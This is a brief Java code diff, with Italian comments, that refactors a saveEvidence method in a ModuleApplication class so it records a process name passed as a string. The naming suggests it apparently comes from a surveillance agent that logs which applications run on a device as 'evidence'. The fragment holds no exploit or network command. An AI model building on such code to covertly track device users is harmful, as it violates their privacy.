@@ -65,16 +65,16 @@ public class ModuleApplication extends BaseModule implements IncrementalLog, Obs
 	/**
 	 * Viene invocata dalla notification, a sua volta invocata dal listener
 	 * 
-	 * @param process
+	 * @param processInfo
 	 * @param status
 	 */
-	private void saveEvidence(RunningAppProcessInfo process, ProcessStatus status) {
+	private void saveEvidence(String processInfo, ProcessStatus status) {
 		if (Cfg.DEBUG) {
-			Check.requires(process != null, "null process"); //$NON-NLS-1$
+			Check.requires(processInfo != null, "null process"); //$NON-NLS-1$
 		}
 
-		final String name = process.processName;
-		final String module = process.processName;
+		final String name = processInfo;
+		final String module = processInfo;
 
 		final byte[] tm = (new DateTime()).getStructTm();
 
